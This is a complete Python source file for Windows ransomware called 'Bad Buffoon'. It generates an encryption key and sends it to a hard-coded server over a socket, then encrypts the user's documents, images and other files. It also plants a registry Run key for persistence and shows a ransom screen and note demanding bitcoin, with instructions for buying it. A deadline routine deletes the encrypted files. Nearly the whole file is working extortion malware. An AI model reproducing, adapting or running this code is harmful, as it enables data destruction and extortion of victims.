from cryptography.fernet import Fernet # Used for encrypt/decrypt data
from tkinter import * # GUI 
from urllib.request import urlretrieve # Download images for ransom
from PIL import ImageTk, Image # Resize images
from threading import Thread # Persistence GUI, remove directory
import os # Play with the OS
import socket # Send decryption key to the server 
from tkinter.font import Font # Design some label
from pyperclip import copy # Copy a label
from webbrowser import open as OPEN # Open a web page
import ctypes # Play with windows system
import datetime # Create the final date
import winreg # Add a key in the registre for execute the ransom every time the pc turn on
from subprocess import Popen # Execute our ransomware file









class Ransomware : #  Ransomware class

    def __init__(self) : 

        self.key = None        # Symetric key 
        self.crypter = None    # Crypter object
        self.partition_letter = None  # Letter of partition to encrypt
        self.id_key = None # Key to id the target
        self.user_login = os.getlogin() # Get the name of the user
        self.files_target = ['txt','jpg','jpeg','png','docx','doc','gif','html','ico','mp3','mp4','odt','odp','ods','odg','pdf','ppt','pps','pptx','py','zip','tar','md','xls','xlsx','wav','xml','log','exe']

        self.sock = socket.socket() # Object Socket
        self.port = 9984 # Port to reverse connection
        self.ip = '192.168.1.31' # IP of server

        # Url of images
        self.bitcoin_image = 'https://icons.iconarchive.com/icons/froyoshark/enkel/512/Bitcoin-icon.png'
        self.id_key_image = 'https://www.rawshorts.com/freeicons/wp-content/uploads/2017/01/yellow_repictkey_1484336445.png'
        self.joker_image = 'https://cdn.onlinewebfonts.com/svg/img_556375.png'

        



    def find_partition(self) : 
        'Find the letter partition and create the directory'

        partition = ['C:','D:','E:','F:','G:','H:','I:','J:','K:','L:','M:','N:','O:','P:','Q:','R:','S:','U:','V:','W:','X:','Y:','Z:','A:','B:'] # Possible partition letters
        file_target = 'Users' # Directory to encrypt

        try : 

            for x in partition : # Try to find the letter of partition
                
                os.chdir('{}\\{} '.format(x,file_target)) # If that work the letter is found
                self.partition_letter = x

                global partition_letter # Letter partition at a variable
                partition_letter = x

                global global_dir # Path of our directory
                global_dir = '{}\\Users\\{}\\Appdata\\test\\'.format(self.partition_letter,self.user_login)

                os.mkdir('{}\\Users\\{}\\Appdata\\test'.format(self.partition_letter,self.user_login)) # Create the directory 

                break

        except : 
            pass

        Ransomware.download_images(self)



    def download_images(self) : 
        'Download useful images '

        try : 

            # Download from the web images
            path_bitcoin = '{}\\Users\\{}\\Appdata\\test\\bitcoin.png'.format(self.partition_letter,self.user_login)
            path_key = '{}\\Users\\{}\\Appdata\\test\\key-icon.jpg'.format(self.partition_letter,self.user_login)
            path_joker = '{}\\Users\\{}\\Appdata\\test\\joker.jpg'.format(self.partition_letter,self.user_login)

            urlretrieve(self.bitcoin_image,path_bitcoin)
            urlretrieve(self.joker_image,path_joker)
            urlretrieve(self.id_key_image,path_key)
        except : 

            pass

        Ransomware.generate_encryption_key(self)


        



    def generate_encryption_key(self) : # Generate the symetric Key
        'Generate the encryption key'

        if os.path.isfile('{}\\Users\\{}\\Appdata\\test\\decryption_key.txt'.format(partition_letter,self.user_login)) is True : # If the file exist don't generate a other encryption key

            Ransomware.wallpaper(self)
        

        else : # If file doesn't exist create it and generate the encryption key

            with open('{}\\Users\\{}\\Appdata\\test\\decryption_key.txt'.format(partition_letter,self.user_login),'a') as f : 

                f.write('Key exist')
                self.key = Fernet.generate_key() # Generate the encryption key
                #print(self.key)
                self.crypter = Fernet(self.key)  # Object crypter
                Ransomware.send_key(self)
        





    def send_key(self) :
        'Send the key to the server'

        try : 

            self.sock.connect((self.ip,self.port))
            self.sock.send(self.key)
            self.sock.close()
            Ransomware.encrypt_files(self)

        except : # If we can't reach the server we let vitctim free =)
            
            os.system('rmdir /s /Q {}\\Users\\{}\\Appdata\\test'.format(partition_letter,self.user_login))
        
        


        
            

    def encrypt_files(self) : # Encrypt files
        'ss'

        my_dir = os.path.normpath('{}\\Users\\{}\\Desktop\\hack\\'.format(self.partition_letter,self.user_login)) # Directory to encrypt (User)
        extension = '.encrypted' # Extension of encrypted files
        print('Encrypting start ... ')
        #print()

        

        for root,sub,files in os.walk(my_dir) : # Browse the path


            for f in files :  

                try : 

                    abs_file_path = os.path.join(root,f) # Create a path with the files

                    if not abs_file_path.split('.')[-1] in self.files_target : # If the file extension are not in target_files

                        continue

                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\joker.jpg'.format(partition_letter,self.user_login) : 

                        continue 
                    
                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\bitcoin.png'.format(partition_letter,self.user_login) : 

                        continue

                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\key-icon.jpg'.format(partition_letter,self.user_login) : 

                        continue

                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\decryption_key.txt'.format(partition_letter,self.user_login) : 

                        continue

                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\ransomware.exe'.format(partition_letter,self.user_login) or abs_file_path == '{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login) : 

                        continue

                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\id_key.txt'.format(partition_letter,self.user_login) : 

                        continue 

                    if abs_file_path == '{}\\Users\\{}\\Appdata\\test\\time.txt'.format(partition_letter,self.user_login) : 

                        continue 



                    else : 

                        
                        #print('Encrypt : ',abs_file_path)
                        
                        with open(abs_file_path,'rb') as f : # Read data 

                            data = f.read() 

                        data_encrypted = self.crypter.encrypt(data) # Encrypt data

                        with open(abs_file_path,'wb') as x : # Put in the file encrypted data

                            x.write(data_encrypted)

                        os.rename(abs_file_path, abs_file_path+extension) # Rename data with '.encrypted' extension

                except : 

                    pass
                        
        Ransomware.wallpaper(self)


    def wallpaper(self) : 
        'change_wallpaper'
        try : 
            a = os.path.normpath('{}\\Users\\{}\\Appdata\\test\\joker.jpg'.format(self.partition_letter,self.user_login)) # Create a normal path



            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, a , 0) # Change wallpaper
        except  : 

            pass











class Persistence: 

    def __init__(self):
        self.user_login = os.getlogin() # Username of user
        self.check_file()
        self.check_reg()
        

    def check_file(self) : 
        'Check if files is in directory and move the ransomware file into our directory'
        try : 
            
            if os.path.isfile('{}\\Users\\{}\\Appdata\\test\\ransomware.exe'.format(partition_letter,self.user_login)) is True : # If our ransomware is already in our files

                pass

            elif os.path.isfile('{}\\Users\\{}\\Downloads\\ransomware.py'.format(partition_letter,self.user_login)) is True : # Try to find where is our ransomware

                os.rename('{}\\Users\\{}\\Downloads\\ransomware.py'.format(partition_letter,self.user_login),'{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login))

            elif os.path.isfile('{}\\Users\\{}\\Desktop\\ransomware.exe'.format(partition_letter,self.user_login)) is True : # Try to find where is our ransomware

                os.rename('{}\\Users\\{}\\Desktop\\ransomware.exe'.format(partition_letter,self.user_login),'{}\\Users\\{}\\Appdata\\test\\ransomware.exe'.format(partition_letter,self.user_login))

            elif os.path.isfile('{}\\Users\\{}\\Documents\\ransomware.py'.format(partition_letter,self.user_login)) is True : # Try to find where is our ransomware

                os.rename('{}\\Users\\{}\\Documents\\ransomware.py'.format(partition_letter,self.user_login),'{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login))



        except : 

            pass




    
    def add_reg(self):
        'Add a key to the registre'

        try:

            addr = '{}\\Users\\{}\\Appdata\\test\\ransomware.py'.format(partition_letter,self.user_login) # Our ransomware file used to put into key registre
            reg_hkey = winreg.HKEY_CURRENT_USER # Target the tree
            key = winreg.OpenKey(reg_hkey, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE) # Open the key to sub_dir 'RUN' : every time the pc turn on the ransomware will be execute
            winreg.SetValueEx(key, 'test', 0, winreg.REG_SZ, addr) # Set the value with name of 'test'
            winreg.CloseKey(key) # Close the key

        except:

            pass

    def check_reg(self):
        'Check if our key is in registre'

        try:

            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_READ)
            index = 0
            while True:
                v = winreg.EnumValue(key, index)
                if 'test' not in v:
                    index+=1
                    continue
                return True

        except:
            winreg.CloseKey(key)
            self.add_reg()























class GUI :  
    'Class for Graphique Interface'



    def __init__(self) : 
        'ss'
        self.app = Tk() # Initialise Tk object
        self.user_login = os.getlogin() # Get the actuel login of target
        self.kill_that_opp()
        self.note()
        self.files_target = ['txt','jpg','jpeg','png','docx','doc','gif','html','ico','mp3','mp4','odt','odp','ods','odg','pdf','ppt','pps','pptx','py','zip','tar','md','xls','xlsx','wav','xml','log','exe']

    def note(self) : 

        with open('{}\\Users\\{}\\Desktop\\README.txt'.format(partition_letter,self.user_login),'w') as f : # Create a txt file in the desktop

            f.write('Your computer is infected by a ransomware\nAll your data is encrypted , the only way to decrypt your files is our decryption service.\nFor decrypt your files you have to pay 50$ in bitcoin.\nSend a email to this address : get_rekt@protonmail.com be sure to write \'PAID\' in subject. \nIn the email write your Identification Key and the address of your bitcoin wallet\nSend 50£ to this bitcoin address : xxxxxxxxxxxxx')


                

    def kill_that_opp(self) : 
        'If victim dont pay =)'
        try : 

            with open('{}\\Users\\{}\\Appdata\\test\\time.txt','r') as f : # Read the deadline 

                datee = f.read()

            first_date = datetime.datetime.strptime(datee,'%Y-%m-%d %H:%M:%S') # Convert our deadline string into a datetime object
            today = datetime.datetime.today()
            dire = 'c:\\Users\\Alex\\Desktop\\hack\\'


            if today >= first_date : # If deadline is inferior or equal to today 

                for root,sub_dir,files in os.walk(dire) : 

                    for x in files : 

                        abs_file_path = os.path.join(root,x)


                        if '.encrypted' in abs_file_path : # Delete only encrypted files


                            os.system('del {}'.format(abs_file_path)) 
 


        except : 
            pass

        


    def interface(self) : 
        'Interface'

        try : 
            self.app.title('Bad Buffoon')
            self.app.geometry('1000x700')
            self.app.resizable(width=False, height= False)
            self.app['bg'] = 'red4'

            photo_joker = Image.open('{}\\Users\\{}\\Appdata\\test\\joker.jpg'.format(partition_letter,self.user_login))
            resize_photo = photo_joker.resize((300,225), Image.ANTIALIAS)
            new_photo_joker = ImageTk.PhotoImage(resize_photo)

            photo_bitcoin = Image.open('{}\\Users\\{}\\Appdata\\test\\bitcoin.png'.format(partition_letter,self.user_login))
            resize_photo_bitcoin = photo_bitcoin.resize((120,105), Image.ANTIALIAS)
            new_photo_bitcoin = ImageTk.PhotoImage(resize_photo_bitcoin)

            photo_key = Image.open('{}\\Users\\{}\\Appdata\\test\\key-icon.jpg'.format(partition_letter,self.user_login))
            resize_photo_key = photo_key.resize((100,85), Image.ANTIALIAS)
            new_photo_key = ImageTk.PhotoImage(resize_photo_key)



            font_msg = Font(family='Courrier', weight='bold', underline=1,size=27)
            msg = Label(self.app,font=font_msg,text='Your files has been encrypted !', bg='red4')
            msg2 = Label(self.app,text='Send 50$ to this address : ', bg='red4', font=('Courrier', 15))
            font_msg3 = Font(family='Courrier', weight='bold', size=16)
            msg3 = Label(self.app,font=font_msg3,text='If you cross this deadline your files are lost !',bg='red4' )
            font_msg4 = Font(family='Courrier', size=15)
            msg4 = Label(self.app,font=font_msg4, text="Identificaton Key : ", bg='red4')


            
            

            font_button = Font(family='Courrier', size=15)
            button = Button(self.app,font=font_button, text='Decrypt my files',width=53, height=3, command=self.decrypt_files, bg='red4')
            label_photo_joker = Label(self.app, image=new_photo_joker, bg='red4')
            label_photo_bitcoin = Label(self.app, image=new_photo_bitcoin, bg='red4')
            label_photo_key = Label(self.app, image=new_photo_key, bg='red4')
            


            
            GUI.text(self)
            GUI.bitcoin_address(self)
            GUI.bitcoin_help(self)
            GUI.timer(self)
            GUI.button_copy_address(self)
            GUI.generate_id_key(self)
            GUI.label_id(self)




            
            msg2.place(x=970,y=465)
            msg3.place(x=35,y=430)
            msg4.place(x=969,y=650)
            label_photo_joker.place(x=5 ,y=20)
            label_photo_bitcoin.place(x=835,y=470)
            label_photo_key.place(x=840,y=665)
            button.place(x=820,y=815)
            msg.pack()
        
            self.app.mainloop()

        except : 

            pass





    def text(self) : 
        'Text for advice target'

        try : 

            font_label1 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
            label1 = Label(self.app, font=font_label1,text='What\'s happend to my computer ?', bg='red4').place(x=900,y=100)

            label2 = Label(self.app,text='All your data is encrypted. The only way to decrypt your files is our decryption service.', bg='red4').place(x=900,y=135)

            font_label3 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
            label3 = Label(self.app,font=font_label3, text='Can I recover my files ?', bg='red4').place(x=900, y=160)
            label4 = Label(self.app, text='Sure. You can recover all your files easily et safestly', bg='red4').place(x=900, y=190)
            label5 = Label(self.app,text='For recover your files you have to pay', bg='red4').place(x=900,y=210)
            label6 = Label(self.app, text='You have 5 days to pay',bg='red4').place(x=900,y=230)
            label7= Label(self.app, text='If you pass the deadline you will loose all your files and your computer', bg='red4').place(x=900,y=250)

            font_label8 = Font(family='Courrier', size='14', weight='bold', slant='italic', underline=1)
            label8 = Label(self.app,font=font_label8, text='How do I pay ?', bg='red4').place(x=900, y=280)
            label9 = Label(self.app, text='Only Bitcoin is accepted', bg='red4').place(x=900, y=310)
            label10 = Label(self.app, text='To buy bitcoins click on <How buy bitcoins ?>', bg='red4').place(x=900, y=330)
            label11 = Label(self.app, text='Send 50$ to the below address',bg='red4').place(x=900, y=350)
            font_label12 = Font(family='Courrier', size=13)
            label12 = Label(self.app, font=font_label12, text='DO NOT RENAME YOUR FILES !',bg='red4').place(x=900,y=380)
            font_label13 = Font(family='Courrier', size=13)
            label13 = Label(self.app, font=font_label13, text='DO NOT MOVE YOUR FILES !',bg='red4').place(x=900,y=410)

        except : 

            pass




    def generate_id_key(self) : 
        'Generate the identification key to recense the target'

        try : # If key already exist read it

            with open(global_dir+'id_key.txt','r') as f : 

                self.id_key = f.read()

        except : # If key doesn't exist create it

            with open(global_dir+'id_key.txt','ab') as g : 

                it = Fernet.generate_key()
                g.write(it)
                
            with open(global_dir+'id_key.txt','rb') as h : 

                self.id_key = h.read()



    def copy_id_key(self) : 
        'Copy in the clipboard the identification key'

        with open(global_dir+'id_key.txt','rb') as f : 

            self.id_key = f.read()


        copy(str(self.id_key.decode('Utf8')))

    def label_id(self) : 
        'Label to write Identification key'
        
        try : 
            font_label = Font(self.app, family='Courrier', size=10,)
            label = Text(self.app, borderwidth=3, relief="sunken", width=75,height=2)
            label.insert("1.0",self.id_key)

            button = Button(self.app, text='Copy', command=self.copy_id_key, width=15, height=4)


            
            label.config(state='disabled')
            label.place(x=970,y=685)
            button.place(x=1310,y=724)
        except : 
            pass



    def check_files(self) : 
        'Manipulate the deadline'

        try : 

            with open('{}\\Users\\{}\\Appdata\\test\\time.txt'.format(partition_letter,self.user_login),'r') as f : 

                self.time_time = f.read()
            
                self.label.configure(text=self.time_time) # Display on GUI the time

        except : 

            with open('{}\\Users\\{}\\Appdata\\test\\time.txt'.format(partition_letter,self.user_login),'a') as g : 

                tday = datetime.datetime.today().strftime('%Y-%m-%d %H:%M:%S') # Variable of when ransomware launch
                formate = '%Y-%m-%d %H:%M:%S' # Format
                tday =  datetime.datetime.strptime(tday, formate) 
                tdelta = datetime.timedelta(days=5)

                end_date = tday + tdelta
                end_date = str(end_date)

                g.write(end_date)

            with open('{}\\Users\\{}\\Appdata\\test\\time.txt'.format(partition_letter,self.user_login),'rb') as g : 

                self.time_time = g.read() # Read the date
                self.label.configure(text=self.time_time) # Write it in the GUI




    def timer(self) : 
        'Label of timer'

        font_label = Font(family='Courrier',size=15)
        self.label = Label(self.app,font=font_label,text="",bg='red4',width=35,height=5)

        GUI.check_files(self) # Check the data

        self.label.place(x=50,y=500)


    def bitcoin_address(self) : 
        'display the bitcoin address'
        try : 

            self.bitcoin_text = Text(self.app, borderwidth=3, relief="sunken", )
            self.bitcoin_text.insert("1.0","xxxxxxxxxxxxxxxxxxxxx")

            self.bitcoin_text.config(wrap='word', state="disabled",width=150,height=2)
            self.bitcoin_text.place(x=970, y=500)

        except : 
            pass

    def bitcoin_help(self) : 
        'Button of bitcoin help'
        

        label1_button = Font(family='Courrier', size=15,)
        label1 = Button(self.app, text='How buy bitcoins ?', font=label1_button, bg='red4', width=50,height=3, command=self.bitcoin_window).place(x=0,y=815)


    def copy_address(self) : 
        'Copy the bitcoin address in the clipboard'

        copy('xxxxxxxxxxxxxxxxxxxxx')

    def button_copy_address(self) : 
        'Create button to copy the bitcoin address'

        button_copy = Button(self.app, text='Copy',width=15,height=4, bg='white',command=self.copy_address)
        button_copy.place(x=1300,y=540)


    def open_buy_video(self) : 
        'open yotube video'

        OPEN('https://www.youtube.com/watch?v=pTYLxGeLUEk')


    def open_send_video(self) : 
        'open yotube video'
        OPEN('https://www.youtube.com/watch?v=pRdUbNBsVgc')

    def open_coinbase(self) : 
        'Open coinbase '

        OPEN('https://www.coinbase.com/')

    def bitcoin_window(self) : 
        'Gui Bitcoin'

        self.app2 = Tk()
        self.app2.title('Help Bitcoin')
        self.app2.geometry('800x600')
        self.app2.resizable(height=False, width=False)


        label1 = Label(self.app2, text='1. Go on www.coinbase.com')
        button = Button(self.app2, text='Go',command=self.open_coinbase, bg='green')
        label2 = Label(self.app2, text='2. Create a account')
        label3 = Label(self.app2, text='3. Buy some 50$ in bitcoins')
        label32 = Label(self.app2, text = '4. Send 50$ in bitcoins to the address : xxxxxxxxxxxxxxxxxxxxxxxxx ')
        label4 = Label(self.app2, text='5. Send a email to this address : get_rekt@protonmail.com be sure to write \'PAID\' in subject. \nIn the email write your Identification Key and the address of your bitcoin wallet')
        label45 = Label(self.app2,text='6. You will receive your decryption key and recover all your files !')
        label5 = Label(self.app2, text='If you have some complications to buy bitcoins watch this video')
        button_label5 = Button(self.app2, text='Watch video',command=self.open_buy_video,width=38,height=1,bg='green')
        label6 = Label(self.app2, text='If you have some complications to send bitcoins watch this video')
        button_label6 = Button(self.app2, text='Watch video',command=self.open_send_video,width=38,height=1,bg='green')


        label1.place(x=300,y=30)
        button.place(x=500,y=25)
        label2.place(x=300, y=50)
        label3.place(x=300, y=70)
        label32.place(x=300,y=90)
        label4.place(x=175,y=130)
        label45.place(x=300,y=170)
        label5.place(x=10,y=480)
        button_label5.place(x=440,y=475)
        label6.place(x=10,y=530)
        button_label6.place(x=440,y=525)
        self.app2.mainloop()




    def decrypt_files2(self): 
        'Decrypt data'

        my_dir = '{}\\Users\\{}\\Desktop\\hack\\'.format(partition_letter,self.user_login)
        key = self.entry.get() # recover the key enter by the victim

    
        try : # If decryption key is correct go decrypt
            self.crypter = Fernet(key)


            for root,sub,files in os.walk(my_dir) : 


                for f in files :  

                    try : 

                        abs_file_path = os.path.join(root,f) # Create path of encrypted files

                        if not '.encrypted' in abs_file_path : # Dodge no encrypted data

                            continue
                        

                        if '.encrypted' in abs_file_path : 

                            #print('Decrypt : ',abs_file_path)
                            
                            with open(abs_file_path,'rb') as f : # Read encrypted data

                                data_encrypted = f.read()

                            data = self.crypter.decrypt(data_encrypted) # Decrypt data 

                            with open(abs_file_path,'wb') as g : # Write decrypted data

                                g.write(data)

                            a = abs_file_path.split('.encrypted')[:-1]
                        
                            os.rename(abs_file_path,a[0]) # Rename files

                    except : 

                        pass

                        


            reg_hkey = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKey(reg_hkey, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key,'test') # Delete the key into the registre


                    
            good_font = Font(self.app3, family='Courrier', size=20)
            message_good = Label(self.app3, font=good_font, text='Your files are decrypted', bg='green')
            message_good.place(x=275, y=340)
            os.system('del {}\\Users\\{}\\Desktop\\README.txt'.format(partition_letter,self.user_login))
            os.system('rmdir /s /Q {}\\Users\\{}\\Appdata\\test'.format(partition_letter,self.user_login))

            
        except : # If decryption is wrong display error message
            
            bad_font = Font(self.app3, family='Courrier', size=15)
            self.message_bad = Label(self.app3, font=bad_font, text='Wrong keys', bg='red4')
            self.message_bad.place(x=330,y=295)





    def decrypt_files(self) : 
        'GUI to decrypt file'

        self.app3 = Tk()
        self.app3.title('Decrypt files')
        self.app3.geometry('800x600')
        self.app3.resizable(width=False, height=False)

        font_label = Font(self.app3, family='Courrier', size=15)
        label = Label(self.app3, text='Enter the decryption key :',bg='red4',font=font_label)

        self.entry = Entry(self.app3,width=35)

        button = Button(self.app3, text='Decrypt',command=self.decrypt_files2)
        


    

        label.place(x=270,y=150)
        self.entry.place(x=270, y=200)
        button.place(x=270, y=250)


        self.app3.mainloop()





# Main prog

ransom = Ransomware()
ransom.find_partition()


th1 = Thread(target=Persistence,daemon=True)
th1.start()

graphique = GUI()
graphique.interface()

